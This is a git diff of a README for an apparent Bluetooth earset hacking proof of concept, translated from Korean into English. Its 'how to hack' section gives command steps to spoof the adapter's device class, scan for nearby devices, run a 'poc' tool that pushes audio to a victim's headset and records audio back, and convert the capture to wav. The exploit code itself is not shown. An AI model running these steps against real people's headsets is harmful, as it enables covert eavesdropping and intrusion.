@@ -1,21 +1,54 @@
-** poc.c compile
- >> gcc -o poc poc.c -lbluetooth 
+# Set up
+## 1. Compile `poc.c`
+- Command
+   ```bash
+   gcc -o poc poc.c -lbluetooth 
+   ```
+   
+## 2. Convert `raw` file to `wav` file
+- Command
+   ```bash
+   sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
+   ```   
+## 3. Convert `wav` file to `raw` file
+- Command
+   ```bash
+   sox --bits 16 --encoding signed-integer --endian little [in.wav] [out.raw]
+   ```
 
-** raw -> wav
- >> sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
-** wav -> raw
- >> sox --bits 16 --encoding signed-integer --endian little [in.wav] [out.raw]
 
-<File info>
-  btScan.py :: 주변의 블루투스 기기를 스캔한다. 단, 해당기기가 검색허용상태여야 한다.
-  rfcommScan.py :: rfcomm프로토콜의 열린 채널을 검색한다.(나의 이어셋 채널은 4개밖에 없어서 channel4까지만 scan)
-  poc :: 블루투스 이어셋에 음성메시지를 전송하고 상대의 음성메시지를 받아온다.
+# File info
+- btScan.py
+  - Locate the Bluetooth device nearby.
+  - However, the device must have the search function turned on.
+- rfcommScan.py
+  - Search for open channels in the rfcomm protocol.
+  - In my case, I have only 4 earset channels, so I only scan channel four.
+- poc
+  - Send a voice message to the Bluetooth earset 
+  - and receive the other person's voice message.
 
-<how to hack>
-1. sudo hciconfig hci0 up			//장비를 on시킨다.
-2. hciconfig -a 					//장비의 정보 중에 class가 있는데 이어셋을 해킹하기 위해서는
-3. hciconfig hci0 class 0x50020c	//0x50020c로 변경한다.:: class-SmartPhone, telephony, ObjectTransfer
-									//(http://bluetooth-pentest.narod.ru/software/bluetooth_class_of_device-service_generator.html)
-4. hcitool scan						//주변 블루투스 장비를 검색한다.
-5. ./poc <hci#> <messagefile> <recordfile> <bdaddr> [channel]	// tool 사용.
-6. sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav] 	//수신한 데이터를 wav파일로 변경
+
+# how to hack the bluetooth earset
+1. Turn on the my bt-device
+   ```bash
+   sudo hciconfig hci0 up
+   ```
+2. In order to hack the earset, the class information of the device is changed. (class info: [link](http://bluetooth-pentest.narod.ru/software/bluetooth_class_of_device-service_generator.html))
+   ```bash
+   hciconfig -a
+   hciconfig hci0 class 0x50020c # (class-SmartPhone, telephony, ObjectTransfer)
+   ```
+   
+4. Locate the Bluetooth device nearby.
+   ```bash
+   hcitool scan
+   ```
+5. send voice to victim from hacker.
+   ```bash
+   ./poc <hci#> <messagefile> <recordfile> <bdaddr> [channel]
+   ```
+6. And then if you recieve a some data, you have to convert file from `raw` file to `wav`file
+   ```bash
+   sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
+   ```
